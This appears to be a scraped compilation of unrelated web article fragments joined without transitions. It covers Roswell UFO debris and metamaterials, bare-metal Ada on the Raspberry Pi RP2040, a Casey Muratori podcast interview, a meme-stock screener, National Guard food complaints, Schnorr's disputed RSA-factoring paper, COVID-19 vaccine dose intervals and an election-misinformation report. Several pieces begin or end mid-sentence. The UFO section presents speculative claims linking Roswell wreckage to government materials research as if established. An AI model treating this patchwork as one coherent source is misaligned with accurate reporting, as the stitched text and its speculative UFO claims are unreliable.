Field in Ohio after the crash. Some months later, Wright granted a contract to Battelle Memorial Institute to begin phase diagrams (recipes) for mixing Nickel and ultra-high-purity Titanium, required to make memory metal. General Arthur Exon, Base Commander at Wright Patterson in the 1960s, who flew over the crash site in 1947, spoke to researcher Kevin Randle on tape. He stated that it was his understanding that some of the wreckage being tested was comprised in part of "specially processed" Titanium.</p>



<p>And in September of 1947, two months after the Roswell crash, General George Shulgen of Air Intelligence described "the materials of construction" of the flying saucers as potentially being made of <span>"composite or sandwich construction utilizing various combinations of metal and plastics."&nbsp;</span> Some of the Roswell crash debris was said to display metal-plastic like appearance and characteristics. The DIA-sponsored reports I received mention a highly-engineered material called "metamaterial" (see below) as comprised of <span>"composite media."</span> Metamaterial can be <span>layered with metal and plastics.</span></p>



<p>Throughout the received FOIA documents, mention is made of potential use of some of the materials in "advanced aerospace platforms." Reference is made to desired material characteristics such as being extremely lightweight and tough, like the characteristics of the debris found at the Roswell crash.</p>



<h6>OTHER MATERIAL</h6>



<p>Extensive reference is also made to the study and application of what the tests called <span>metamaterial</span>*, including that some of this material:</p>



<ul>
	<li>
	<p><span>Can be used to "slow down light" and even "bring light to a complete standstill"</span></p>
	</li>
</ul>

<p>(Implying the ability to manipulate the speed of light (electromagnetic energy traveling at 186,000 miles per second)</p>



<ul>
	<li>
	<p><span>May induce invisibility by manipulating refraction, reflectivity and increasing light absorption. The reports use terms like "optical isolation" and "transparency" and make reference to a "MetaMirror" technology</span></p>
	</li>
</ul>

<p>(Implying the ability to make something unable to be seen, and/or picked up by radar, scanning or imaging)</p>



<ul>
	<li>
	<p><span>Has the interesting ability to "compress electromagnetic energy"</span></p>
	</li>
</ul>

<p>(Such condensing can make information and energy storage smaller and their transfer faster by reducing volume)</p>



<ul>
	<li>
	<p><span>Exhibits a particular "tunable resonance" which was likely "determined during fabrication."</span></p>
	</li>
</ul>

<p>(The phrase "tunable resonance" refers to a vibration of large amplitude from a small stimulus. Very recent research shows potential in the field of "energy harvesting" technologies, or pulling energy from the environment for low-power electronic devices)</p>

<p><span>​</span></p>

<p>There seem to be many exciting, but far in the future, technical applications to these materials that will change the way our lives are lived.</p>



<p><span>*Metamaterial</span>, a coined and relatively recent word, is believed to be any material engineered to have a property that is not found in naturally occurring materials. Some of these materials appear to be made from assemblies of multiple elements fashioned from composite materials such as metals and plastics. These composite media can be engineered to exhibit unique electromagnetic properties. Made up from subwavelength building blocks (most often based on metals), these metamaterials allow for extreme control over light energy and optical fields, enabling such effects such as negative refraction to be realized.</p>

<p><span>​</span></p>

<p>Portions of the reports center on next-generation <span>Amorphous Metals</span> (also called "liquid metal" or "metallic glass") which are novel engineering alloys with disordered atomic-scale structure. Metal is crystalline in its solid state, which means it has a highly ordered arrangement of atoms. Amorphous metals though are crazily disordered - a metal-like material so unique that it is believed it may one day replace plastic and metal in many applications. The material is stronger and lighter than any existing metal, can be injection molded like plastic (no rivets, seams or joining, smooth like many reported UFOs) and will never corrode or rust. Imagine using a single razor blade for the rest of your life because it stays super sharp forever. A golf club so springy it can drive a ball farther than any pro ever has. An artificial hip implant that performs better than a real hip. A cell phone case that is completely indestructible.</p>



<p>The contract that Bigelow was granted was under the auspices of an official government UFO study (whose existence was revealed by <span>The New York Times</span> in 2017). The contract was for Bigelow to construct "specialized modified facilities" to hold the material for testing. The DoD/Pentagon UFO study effort was called the Advanced Aerospace Threat Identification Program (AATIP). It ran for some years (and under more than one name), and according to informed sources, remains in operation to this day. What is inside these "specially modified facilities" that requires such contracted technical services? What is the nature of this anomalous debris and what are its properties that it requires shielding?</p>

<p><span>​</span></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
<p>Recently, the Raspberry Pi Foundation launched their new <a href="https://datasheets.raspberrypi.org/rp2040/rp2040-datasheet.pdf">RP2040 SoC</a> on a $4 development board called <a href="https://datasheets.raspberrypi.org/pico/pico-datasheet.pdf">Pico</a>. As the foundation’s goal is primarily education, they’ve provided lots of high quality documentation, libraries, and examples for the new chip. Naturally, I’m going to ignore most of that and roll my own. Why? Because this is my idea of fun and I’m trapped inside during a pandemic.</p>
<p>If you’d like to build the examples and follow along, you’ll need <a href="https://www.adacore.com/download">GNAT Community 2020 ARM ELF</a> installed in your PATH. I’ve only tested this on x86_64 Debian, if you’re on another platform I can’t help you. You’ll also want an SWD debugger that works with the RP2040. I use openocd on a Raspberry Pi, I hear Segger J-Link support is coming soon. Technically you could use elf2uf2 and load binaries over USB, but that’s gonna get tedious for any nontrivial debugging.</p>
<p>The RP2040 has no internal flash. The boot ROM loads 256 bytes of code from an external SPI flash and executes it. This “second stage bootloader” is expected to configure the XIP (eXecute In Place) peripheral with clock and timing details specific to the flash chip in use, then jump to the start of the user code in the memory mapped to the flash.</p>
<p>I tried to rewrite the <code>boot2.S</code> bootloader from pico-sdk in Ada, but I couldn’t get it to fit inside 256 bytes. It might be possible, but not today. I ran gcc’s preprocessor on <code>boot2.S</code> to generate a single assembly file I could link. I copied the linker script and <code>crt0.S</code> from pico-sdk too.</p>
<p>The <code>zfp-cortex-m0p</code> Ada runtime does most of the boilerplate Cortex-M0+ setup and implements <code>Ada.Text_IO</code> with semihosting over the debug interface, so I wrote a hello world and copypasta’d a GPR project file to build it.</p>
<figure><pre><code data-lang="ada"><span>with</span> <span>Ada</span><span>.</span><span>Text_IO</span><span>;</span> <span>use</span> <span>Ada</span><span>.</span><span>Text_IO</span><span>;</span>

<span>procedure</span> <span>Main</span> <span>is</span>
<span>begin</span>
   <span>Put_Line</span> <span>(</span><span>"Hello, RP2040!"</span><span>);</span>
<span>end</span> <span>Main</span><span>;</span></code></pre></figure>
<p>It took me a few hours to figure out the right incantation to get the linker to put the .boot2 section at the start of the flash chip along with crt0.S and the Ada runtime’s init code. The result is an ugly mess, which is why I’m omitting it here. If you want to see how to do things the quick and dirty way, <a href="https://github.com/JeremyGrosser/rp/tree/744e546999aba596701dcf89d4f5e39f056932e0">my initial attempt is on github</a>.</p>
<p>I soldered some headers for the Pico’s SWD port, wired it to a Raspberry Pi 4, and compiled the <a href="https://github.com/raspberrypi/openocd/tree/rp2040">raspberrypi branch of openocd</a>. As far as I can tell, nobody distributes a toolchain that can cross-compile Ada arm-eabi binaries on aarch64 and I don’t want to spend my time building binutils and gcc right now, so I setup an ssh tunnel from my x86_64 workstation to the Pi. I run arm-eabi-gdb locally and connect to openocd over the tunnel. Most of this will go in a .gdbinit script later.</p>
<p><img src="https://synack.me/img/raspberrypi-swd.png" alt="Raspberry Pi SWD wiring"></p>
<div><div><pre><code>ssh pi@192.168.1.202 -L3333:localhost:3333
openocd -f interface/raspberrypi-swd.cfg -f target/rp2040.cfg

arm-eabi-gdb obj/main
target extended-remote localhost:3333
monitor arm semihosting enable
load
run
</code></pre></div></div>
<p>Let’s write some code! For this example, I’m not going to do anything particularly complicated or idiomatic to Ada in order to keep things as simple as possible. This is going to be a very imperative program assigning values to registers and not much more.</p>
<p>ARM’s tooling for silicon vendors generates an SVD file, which is a pile of XML that lists all of the peripheral addresses and register offsets with vaguely human readable names. The svd2ada program translates this into Ada spec files with record types and representation clauses. Unfortunately, it crashed with the RP2040 SVD file. svd2ada expects a <code>&lt;size&gt;</code> to be specified on every register but the RP2040 SVD defines <code>&lt;size&gt;</code> at the peripheral level. The SVD format says this should then be inherited by the registers in the peripheral, but svd2ada doesn’t do that. I couldn’t figure out how to fix svd2ada so I wrote a quick Python script to modify the SVD file by copying the <code>&lt;size&gt;</code> field to every register within a peripheral. Now svd2ada works and generates a <code>.ads</code> file for each peripheral on the RP2040.</p>
<p>Normally the next step in bringing up a new chip would be to get all of the clocks configured, which is usually pretty boring code to write. At startup, the RP2040’s system clock runs from an internal ring oscillator with a not at all predictable or stable frequency between 1.8 and 12 MHz, which is good enough for some blinking. I skipped clock configuration and went straight for the GPIO.</p>
<p>There are four peripherals that need to be configured to toggle a pin: RESETS, PADS_BANK, IO_BANK, and SIO. RESETS, as you might expect, controls the reset state of the other peripherals. I pull the IO_BANK and PADS_BANK out of reset and wait for any initialization these peripherals might need to do in a busy loop.</p>
<figure><pre><code data-lang="ada"><span>RESETS_Periph</span><span>.</span><span>RESET</span><span>.</span><span>io_bank0</span> <span>:=</span> <span>False</span><span>;</span>
<span>RESETS_Periph</span><span>.</span><span>RESET</span><span>.</span><span>pads_bank0</span> <span>:=</span> <span>False</span><span>;</span>
<span>while</span> <span>not</span> <span>RESETS_Periph</span><span>.</span><span>RESET_DONE</span><span>.</span><span>io_bank0</span> <span>or</span> <span>else</span> <span>not</span> <span>RESETS_Periph</span><span>.</span><span>RESET_DONE</span><span>.</span><span>pads_bank0</span> <span>loop</span>
  <span>null</span><span>;</span>
<span>end</span> <span>loop</span><span>;</span></code></pre></figure>
<p>Next, PADS_BANK enables the output driver on GPIO25, which is connected to the LED on the Pico board.</p>
<figure><pre><code data-lang="ada"><span>--  output disable off</span>
<span>PADS_BANK0_Periph</span><span>.</span><span>GPIO25</span><span>.</span><span>OD</span> <span>:=</span> <span>False</span><span>;</span>
<span>--  input enable off</span>
<span>PADS_BANK0_Periph</span><span>.</span><span>GPIO25</span><span>.</span><span>IE</span> <span>:=</span> <span>False</span><span>;</span></code></pre></figure>
<p>IO_BANK selects a peripheral to connect the pad to.</p>
<figure><pre><code data-lang="ada"><span>--  function select</span>
<span>IO_BANK0_Periph</span><span>.</span><span>GPIO25_CTRL</span><span>.</span><span>FUNCSEL</span> <span>:=</span> <span>sio_25</span><span>;</span></code></pre></figure>
<p>The SIO (single-cycle IO) peripheral can toggle pins. I added a Pin_Mask constant in the declare block with bit 25 set. svd2ada generates nice subtype definitions for each register field so that I don’t need to know that GPIO_OUT is 30 bits wide. The immediate value here is just <code>Shift_Left (1, 25)</code>, but using Shift_Left here would require some type conversion that I want to avoid in this example.</p>
<figure><pre><code data-lang="ada"><span>Pin_Mask</span> <span>:</span> <span>constant</span> <span>GPIO_OUT_GPIO_OUT_Field</span> <span>:=</span> <span>16#0200_0000#</span></code></pre></figure>
<p>Enable the output in the SIO peripheral</p>
<figure><pre><code data-lang="ada"><span>-- output enable</span>
<span>SIO_Periph</span><span>.</span><span>GPIO_OE_SET</span><span>.</span><span>GPIO_OE_SET</span> <span>:=</span> <span>Pin_Mask</span><span>;</span></code></pre></figure>
<p>Now we blink!</p>
<figure><pre><code data-lang="ada"><span>loop</span>
   <span>SIO_Periph</span><span>.</span><span>GPIO_OUT_SET</span><span>.</span><span>GPIO_OUT_SET</span> <span>:=</span> <span>Pin_Mask</span><span>;</span>
   <span>SIO_Periph</span><span>.</span><span>GPIO_OUT_CLR</span><span>.</span><span>GPIO_OUT_CLR</span> <span>:=</span> <span>Pin_Mask</span><span>;</span>
<span>end</span> <span>loop</span><span>;</span></code></pre></figure>
<p>Assuming those calls actually get compiled into single cycle writes, that’s gonna be blinking at half the system clock frequency, far faster than the human eye can see, but good enough for an oscilloscope. The SIO peripheral has an XOR register that allows us to make this code even shorter.</p>
<figure><pre><code data-lang="ada"><span>loop</span>
   <span>SIO_Periph</span><span>.</span><span>GPIO_OUT_XOR</span><span>.</span><span>GPIO_OUT_XOR</span> <span>:=</span> <span>Pin_Mask</span><span>;</span>
<span>end</span> <span>loop</span><span>;</span></code></pre></figure>
<p>This is where the narrative diverges from reality. After I got to this point, I spent a few days refactoring the code into a package with well defined types and interfaces that conform to the Ada HAL package. For the sake of this example, I’m going to gloss over some of those organizational details and pretend things are still mostly happening in a single Main procedure.</p>
<p>Next I need a delay in that loop to blink at a rate that’s perceptible to humans. I could call a bunch of <code>nop</code> instructions and waste cycles, but that’s just silly. The RP2040 has a very nice 64-bit timer peripheral that I completely ignored because the chip also has the standard ARM SysTick peripheral that I’m already familiar with. Exported symbols need to be defined at the package level, so I’ve put this code into a SysTick package. I’ve only reproduced the implementation bits here, just know that this is happening in a new file.</p>
<figure><pre><code data-lang="ada"><span>--  Reload every 1ms</span>
<span>PPB_Periph</span><span>.</span><span>SYST_RVR</span><span>.</span><span>RELOAD</span> <span>:=</span> <span>SYST_RVR_RELOAD_Field</span> <span>(</span><span>12_000_000</span> <span>/</span> <span>1_000</span><span>);</span>

<span>PPB_Periph</span><span>.</span><span>SYST_CSR</span> <span>:=</span>
    <span>(</span><span>CLKSOURCE</span> <span>=&gt;</span> <span>True</span><span>,</span> <span>--  cpu clock</span>

     <span>others</span>    <span>=&gt;</span> <span>&lt;&gt;</span><span>);</span></code></pre></figure>
<p>I need an interrupt handler to increment a counter for every tick. crt0.S exports a weak <code>isr_systick</code> symbol that I can implement.</p>
<figure><pre><code data-lang="ada"><span>Ticks</span> <span>:</span> <span>Natural</span> <span>:=</span> <span>0</span><span>;</span>

<span>procedure</span> <span>SysTick_Handler</span>

         <span>External_Name</span> <span>=&gt;</span> <span>"isr_systick"</span><span>;</span>

<span>procedure</span> <span>SysTick_Handler</span> <span>is</span>
<span>begin</span>
    <span>Ticks</span> <span>:=</span> <span>Ticks</span> <span>+</span> <span>1</span><span>;</span>
<span>end</span> <span>SysTick_Handler</span><span>;</span></code></pre></figure>
<p>I’ll also add a wrapper around the <code>wfi</code> (wait for interrupt) assembly instruction in the same package</p>
<figure><pre><code data-lang="ada"><span>procedure</span> <span>Wait</span> <span>is</span>
<span>begin</span>
    <span>System</span><span>.</span><span>Machine_Code</span><span>.</span><span>Asm</span> <span>(</span><span>"wfi"</span><span>,</span> <span>Volatile</span> <span>=&gt;</span> <span>True</span><span>);</span>
<span>end</span> <span>Wait</span><span>;</span></code></pre></figure>
<p>Back in the blink loop, I call the wait for interrupt instruction and check the value of Ticks.</p>
<figure><pre><code data-lang="ada"><span>loop</span>
   <span>if</span> <span>SysTick</span><span>.</span><span>Ticks</span> <span>&gt;=</span> <span>Next_Blink</span> <span>then</span>
      <span>SIO_Periph</span><span>.</span><span>GPIO_OUT_XOR</span><span>.</span><span>GPIO_OUT_XOR</span> <span>:=</span> <span>Pin_Mask</span><span>;</span>

   <span>SysTick</span><span>.</span><span>Wait</span><span>;</span>
<span>end</span> <span>loop</span><span>;</span></code></pre></figure>
<p>IT BLINKS! Not precisely at 1 Hz, as the ring oscillator isn’t accurate, but close enough for this demo.</p>

<h2 id="intro"><strong>Intro</strong></h2>
<p><strong>Adam:</strong>
Hello, and welcome to CoRecursive. I’m Adam Gordon Bell. I’m trying to find and share the personal experiences of building software. I’m not really a big gamer, but lately I fell down this rabbit hole into the world of Casey Muratori, and this project that he started on Twitch in 2014.</p>
<p><strong>Casey:</strong>
The videos are me just programming. They’re not even good. I mean, I’ll be honest. I’d love to say that they’re amazing, and that I’m really great. But they’re not. They’re not. All they are is a regular programmer who does actual real programming work. Right? It just ended up taking on a life of its own.</p>
<p><strong>Adam:</strong>
Casey’s game programming videos, they started a movement. It’s a movement that in some ways feels like software development from the ’70s. But in other ways, it’s totally modern and maybe points towards the future of learning or entertainment. I’m not sure where to start with Casey’s story, but the basics of his approach, they date to this job he had in the late ’90s.</p>
<p><strong>Casey:</strong>
In 1999, I took a job at RAD Game Tools. I was still a C++ programmer at the time, meaning I was still … If I was going to write a matrix multiplication, it would be like templatized on the size of the matrix. Right? Traditional C++ class hierarchy with inheritance kind of programming. Smart pointers, for example. One of the things that was cool about RAD Game Tools is it was me and there were two other programmers there. RAD Game Tools is legendary in that the amount of money they make per programmer is staggering.</p>

<p>They were making millions of dollars a year and they had three programmers or something, and not on weird web laundering of money where you basically you’re selling ads to be like … Literally selling software. This is libraries they’re selling. Right? The two programmers there at the time, beside me, when I joined Jeff Roberts, who has literally written the video codec for every game basically in existence almost in history. Every game. Name a game, the videos play back through something Jeff wrote, right? From basically the year ‘94 to today.</p>
<p><strong>Adam:</strong>
Wow.</p>
<p><strong>Casey:</strong>
Whatever the latest game is you pick up, it’s videos are playing back through something Jeff wrote. The other programmer was John Miles, who’s the guy who wrote the engine for Ultimate 5 way back in the day. He wrote the Miles Sound System which was the sound system used in most dos games. It was extremely popular, still exist to this day, in fact, and it’s used by people for sound. I want to say he also wrote the render on Wing Commander III. Anyway, those two programmers who were there and they are old school C programmers.</p>

<p>Here I am looking at this and I’m like, “Well, these are way better programmers than me, and they don’t use any of this stuff, and I wonder why.” Right? Why is it that you get some programmers who are literally some of the best programmers I’ve ever seen and they don’t use any of this stuff? Why is that? Right? Not only that, but if you take Jeff, for example, it might be argued he’s a programmer who as far as the video game world is concerned. I mean, it’s staggering to think of how many games have his code in it. Right?</p>

<p>Because they all [inaudible 00:03:32] It’s just like looking at how impactful they are and what amazing stuff they were able to do, and it’s like why am I using all this stuff? Do I know something they don’t? Because that seems unlikely. Right? There’s a little bit of programmery I always know what I’m doing nonsense, and it’s like do you? I mean, why are these other people who are so good not need that thing? Right. Being honest with you, you have to be a little bit introspective and go, “What’s going on here?”</p>
<h2 id="being-critical-of-your-own-skills"><strong>Being Critical Of Your Own Skills</strong></h2>
<p><strong>Adam:</strong>
Did these guys talk to you and say why are you using templates or-</p>
<p><strong>Casey:</strong>
No. It was just … I mean, I am always as critical of my own habits as I am of anybody else’s, right? If I am aggravated with some piece of software that someone else’s … I’ve had some famous rants about Visual Studio, for example, and how bad it’s gotten. That dialogue, I mean, you might be tempted to think that that is just me complaining about someone else [inaudible 00:04:36] software. No. That dialogue is happening in my head about my programs all the time. I always think they’re terrible, right?</p>

<p>I’m always going what could I have done to make this less terrible? It only comes out of that. It was me just looking and going like, “There’s probably something to learn here.” Incontrovertible, these guys are better programmers than I am. That’s true. One reason for that could be that I just suck and I’m never going to get any better, so it doesn’t matter. So just keep using C++ and whatever. Right? Another possibility is that I could learn to be as good as they are, and I’m just not taking it seriously enough. I’m not trying. Right?</p>
<p><strong>Adam:</strong>
Yeah.</p>
<p><strong>Casey:</strong>
Yes I’m trying to program, but I’m not trying to get better. Right? What are things I can use to get better? Well, I can look at what they are doing and go, “What about what I am doing is different, and can I assess if any of those are the answer?” Because they might not be. It might be that they just happened to program in C and I happened to program at C++, and they happened to be good and I happen to suck. That’s a totally possible thing that could have happened there. But another thing could be that actually I could be good, I could be writing code as good as they are, but I need to learn what are the things that they know that I don’t?</p>

<p>What are the practices they have that I don’t have? Right? I always try to do that as much as I can. If I see something that looks like it’s working well, or that they’re getting something done well, I try to go, “How can I reassess what I’m doing to see whether there’s something of that that would make a difference for me?” Because I want to be better, I don’t want to be writing bad code. But it’s not always obvious how to improve.</p>
<h2 id="trying-just-plain-c-programming"><strong>Trying Just Plain C Programming</strong></h2>
<p><strong>Adam:</strong>
Did you spend time watching them code?</p>
<p><strong>Casey:</strong>
Not in so many words. I never walked into someone’s office and was like, “Teach me how to program.” But I tried to say what are the things I could do that would assess my own practices in light of the fact that I have some good examples just sitting here? Because typically watching a programmer program at that time would have been creepy. I’d be sitting and we’d be like, “Kilroy was here.” I’m peeking up over the chair. A little Casey head pops up. What I did was I was in charge of the character animation system, and I wrote the first version, it sucked. I was going to write the second version as, let me try. Because I started programming C, not C++, and I had become a C++ programmer.</p>

<p>I was like, “Let me try just going back to see,” because honestly I know how to do it because I used to program [inaudible 00:07:22]. Let me try going back to C and what I’m going to do is I’m only ever going to use one of these features in C++ if I actually can demonstrate to myself that it would create a benefit here. What I found was that literally the only two things that were at all useful were operator overloading and function overloading. Those are the only two. Everything else, I was like, “Yep. The code was better without it.” Unlike most programmers, I actually had the experience of literally taking the time to see, do these features actually improve the code or don’t they?</p>

<p>I could actually test it because I was fortunate to have the time and control over a project to actually see what happened. From there, I was just like, “You know what? I need to do that for everything. I need to actually start taking this seriously and stop just assuming that because someone else puts something in a language that it must be good.” When you change your thinking to I’m going to evaluate rather than I’m going to trust, what you start finding is that most things most people say are mostly wrong, and the reason for that is they have to be because a lot of them are overlapping.</p>

<p>Most of the time you see two different people suggesting two different ways to do something, obviously someone’s wrong or there isn’t a better way to do it, meaning it doesn’t matter which one you pick. Either somebody was wrong and one of them was the correct way, in which case there was one that you should have rejected, or it doesn’t matter which way you do this, in which case they were all wrong for suggesting that you needed to do it this way. I think ever since that point in my career, it’s been about 20 years since then, I’ve just always evaluated things as carefully as I could.</p>

<p>When I see a new thing suggested, I go, “What does this actually yield?” If I look at the difference between doing it this way and doing it in whatever way I would have done it before, and I go, “Does that result in less lines of code, less bugs, less time?” Blah, blah, blah. I go, “Can I make an argument along any of these lines?” What you’ll find out if you do this, honestly, is a lot of the stuff is just a waste of your time.</p>
<h2 id="the-do-it-yourself-development-aesthetic"><strong>The Do It Yourself Development Aesthetic</strong></h2>
<p><strong>Adam:</strong>
Casey, didn’t just leave C++ behind, he also nurtured this sort of obscenely DIY development aesthetic that’s pretty uniquely his. He doesn’t use an IDE. Just Emacs <sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>. He doesn’t use make or a build script. He doesn’t use any libraries. He thinks other people should try this approach.</p>
<p><strong>Casey:</strong>
I think everyone should have the experience of building something from the ground up. Most programmers, no matter what they work on, would benefit greatly from having written one thing from scratch, meaning start in a fairly bare language, such as C, don’t use the libraries, just write everything yourself from just basic things. Even better if you want to try assembly language, but assembly language has a bunch of things that you have to do, like register …</p></div></div>

            <p> This screener assesses stocks by the following two factors:
                </p>
        <ul>
            <li>Highest short interest</li>
            <li>Mentions on Reddit</li>
        </ul><p>
        An indicator of whether they may be the next "meme stock". Short interest represents the total number of shorted shares divided by the number of shares outstanding. It is a helpful indicator that gives people an idea of what the overall market feels about a particular stock by showing what short-sellers are doing.
Historically, hedge funds would often announce their short position on a stock.
Investors can take advantage of understanding short interest by being able to predict the next “short squeeze”; in other words, a situation in which the stock jumps sharply higher, forcing short sellers who had bet that its price would fall, to buy it in order to prevent even bigger losses.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Members of Congress said troops at the Capitol have been hospitalized, because their food is below substandard quality.</p><div>
                            <p>WASHINGTON — In their final days protecting the U.S. Capitol from a potential reprise of domestic terrorism, members of the Michigan National Guard reported metal shavings, feathers, and undercooked meat found in substandard meals, a potential readiness risk that has hospitalized troops.&nbsp;</p>
                    <p>Michigan members of the House of Representatives wrote a letter Tuesday to Gen. Daniel Hokanson, chief of the National Guard, expressing their displeasure with the findings.&nbsp;</p>
                        
                    <p>"It is completely unacceptable that our men and women serving in Washington D.C are being hospitalized due to the food they are being provided," the letter said. "We request that either the current contract be voided and a new food provider be brought in or that the service members be provided with a per diem throughout their remaining time in Washington, D.C.”</p>
                    <p>According to a closed-door National Guard update given to members of Congress, 59 people had wide-ranging gastrointestinal issues because of food consumed at the Capitol. Some of the troops managed their conditions in their quarters, others required a hospital diagnosis.</p>

                    <p>As reports of undercooked and underprepared food increased Monday, Sen. Gary Peters and Rep. Daniel Kildee, Democrats of Michigan, called for the firing and replacement of the meal contractor, sending appeals directly to the National Guard Bureau at the Pentagon.</p>
                    <p>“It is simply unacceptable that these men and women are being fed chicken with the feathers still attached, and raw ground beef,” Peters wrote to Hokanson. “After several attempts to rectify the situation and little progress, I believe that the only appropriate course of action is for the immediate cancellation of the existing food contract, the disbursement of per diem for the remaining duration of the mission and to provide retroactive per diem.”</p>
                    <p>Roughly 1 in 5 of the National Guard troops within the Capitol perimeter are from Michigan. Their mandate expires March 12, when Defense Sec. Lloyd J. Austin III said all troops are expected to leave the Capitol grounds.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

<p>Schnorr just released a new paper <a href="https://eprint.iacr.org/2021/232">Fast Factoring Integers by SVP Algorithms</a> with the words "This destroyes the RSA cryptosystem." (spelling included) in the abstract.</p>
<p><img alt="schnorr destroys RSA" src="https://www.cryptologie.net/upload/schnorr.jpg"></p>
<p>What does this really mean? The paper is honestly quite dense to read and there's no conclusion in there.</p>
<p><strong>UPDATE</strong>: Several people have pointed out that the "This destroyes the RSA cryptosystem" is not present in the paper itself, that is until the paper was updated to include the sentence without the typo.</p>
<p><strong>UPDATE</strong>: There was some discussion about a potential fake, but several people in the industry are confirming that this is from Schnorr himself:</p>
<p><img alt="schnorr destroyes RSA" src="https://www.cryptologie.net/upload/Screen_Shot_2021-03-03_at_3.07_.21_PM_.png"></p>
<p><strong>UPDATE</strong>: Sweis is <a href="https://sweis.medium.com/did-schnorr-destroy-rsa-show-me-the-factors-dcb1bb980ab0">calling for a proof of concept</a>:</p>
<blockquote>
<p>According to the claims in Schnorr’s paper, it should be practical to set significant new factoring records. There is a convenient 862-bit RSA challenge that has not been factored yet. Posting its factors, as done for the CADO-NFS team’s records, would lend credence to Schnorr’s paper and encourage more review of the methodology.</p>
</blockquote>
<p><strong>UPDATE</strong>: <a href="https://twitter.com/ducasleo/status/1367367057055109125?s=11">Léo Ducas</a> has been trying to implement the claim, <a href="https://github.com/lducas/SchnorrGate">without success</a>.</p>
<p><strong>UPDATE</strong>: Geoffroy Couteau thinks the claim is wrong:</p>
<blockquote>
<p>several top experts on SVP and CVP algorithms have looked at the paper and concluded that it is incorrect (I cannot provide names, since it was in the context of anonymous reviews).</p>
</blockquote>
<p><strong>UPDATE</strong>: Daniel Shiu <a href="https://crypto.stackexchange.com/questions/88582/does-schnorrs-2021-factoring-method-show-that-the-rsa-cryptosystem-is-not-secur/88601#88601">pointed out an error in the paper</a></p>
<p><strong>UPDATE</strong>: Pedro Fortuny Ayuso is <a href="https://news.ycombinator.com/item?id=26332034">very skeptical of the claim</a>. Will he end up eating his shirt?</p>
<blockquote>
<p>Schnorr is 78 years old. I am not gerontophobic (being 50 I am approaching that age) but: Atiyah claimed the Riemann Hypothesis, Hironaka has claimed full resolution of singularities in any characteristic... And I am speaking of Fields medalists.
So: you do really need peer-review for strong arguments.</p>

But it amounts right now to a basically population level experiment. And I think it needs to be done as we expect clinical trials to be carried out," Nemer told CBC News Network's <em>Power &amp; Politics</em>&nbsp;today.&nbsp;</p>  <p>Nemer told host Vassy Kapelos that the data provided so far by&nbsp;Moderna and Pfizer on their&nbsp;vaccines were&nbsp;gathered when the first and second doses of the vaccines were being spaced three to four weeks apart, not three to four months apart.&nbsp;</p>  <p>"I think it's really important that we stick with the data and with the great science that give us these fantastic vaccines, and not tinker with it," she said.&nbsp;</p>  <p>If provinces want to find out if the interval between&nbsp;the first and second doses&nbsp;can be extended to 16 weeks, she said,&nbsp;those provinces should conduct proper clinical trials by registering participants and&nbsp;explaining to them the possible advantages and disadvantages of taking part.</p>    <p>She said that while such&nbsp;trials might show that it's&nbsp;safe to extend the interval to four months, Canada is not there yet.&nbsp;&nbsp;</p>  <p>"For now, we simply don't have enough data that tells&nbsp;us this is an effective strategy, particularly when we think that we have variants of the virus that are emerging that are not as well recognized by the vaccine," Nemer said.&nbsp;</p>  <p>"Partial immunity is something that people need to be very wary of.

Centre for Disease Control,&nbsp;and countries around the world,&nbsp;shows&nbsp;"miraculous" protection of at least 90 per cent from the first dose of the&nbsp;Moderna or Pfizer-BioNTech vaccine.</p>  <h2>NACI guidance</h2>  <p>Henry said the B.C. CDC has been exchanging data with colleagues across the country and similar results are&nbsp;coming from&nbsp;Quebec, as well as from the U.K., Israel and other countries.</p>  <p>She also said&nbsp;the National Advisory Committee on Immunization (NACI) has been looking at the issue and will be issuing a statement on the matter in the near future.</p>  <p>As of March 1, however, the advice&nbsp;NACI is providing on its website says&nbsp;that the interval between the first and second shots of the Moderna vaccine should be four weeks, the interval for Pfizer should be three weeks and the interval for the Oxford-AstraZeneca vaccine should be 12 weeks.&nbsp;</p>    <p>The head of Moderna's Canadian operations, Patricia Gauthier, told Kapelos Monday that the company's own trials, and the conditions under which the vaccine&nbsp;was approved by Health Canada, are tied to a four week interval.</p>  <p>"That being said, we're in times of pandemic and we can understand that there are difficult decisions to be made," Gauthier said. "This then becomes a government decision. We stand by the product monograph approved by Health Canada, but governments ... can make their own decisions."</p>  <p>Gauthier said she is not aware of any studies done or led by Moderna on what happens when the interval between the first and second doses is changed from four weeks to four months.</p></span></p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div data-block-type="2" id="block-yui_3_17_2_1_1614633157759_7259"><div><p>On January 6, 2021, an armed mob stormed the US Capitol to prevent the certification of what they claimed was a “fraudulent election.” Many Americans were shocked, but they needn’t have been. The January 6 insurrection was the culmination of months of online mis- and disinformation directed toward eroding American faith in the 2020 election.</p><p>US elections are decentralized: almost 10,000 state and local election offices are primarily responsible for the operation of elections. Dozens of federal agencies support this effort, including the Cybersecurity and Infrastructure Security Agency (CISA) within the Department of Homeland Security, the United States Election Assistance Commission (EAC), the FBI, the Department of Justice, and the Department of Defense. However, none of these federal agencies has a focus on, or authority regarding, election misinformation originating from domestic sources within the United States. This limited federal role reveals a critical gap for non-governmental entities to fill. Increasingly pervasive mis- and disinformation, both foreign and domestic, creates an urgent need for collaboration across government, civil society, media, and social media platforms.&nbsp;&nbsp;</p><p>The Election Integrity Partnership, comprising organizations that specialize in understanding those information dynamics, aimed to create a model for whole-of-society collaboration and facilitate cooperation among partners dedicated to a free and fair election. With the narrow aim of defending the 2020 election against voting-related mis- and disinformation, it bridged the gap between government and civil society, helped to strengthen platform standards for combating election-related misinformation, and shared its findings with its stakeholders, media, and the American public. This report details our process and findings, and provides recommendations for future actions.&nbsp;&nbsp;</p><h2>Who We Are: EIP and Its Members</h2><p>The Election Integrity Partnership <a href="https://www.eipartnership.net/news/announcing-the-eip"><span>was formed to enable real-time information exchange</span></a> between election officials, government agencies, civil society organizations, social media platforms, the media, and the research community. It aimed to identify and analyze online mis- and disinformation, and to communicate important findings across stakeholders. It represented a novel collaboration between four of the nation’s leading institutions focused on researching mis- and disinformation in the social media landscape:&nbsp;</p><ul data-rte-list="default"><li><p>The Stanford Internet Observatory (SIO)&nbsp;</p></li><li><p>The University of Washington’s Center for an Informed Public (CIP)&nbsp;</p></li><li><p>Graphika&nbsp;</p></li><li><p>The Atlantic Council’s 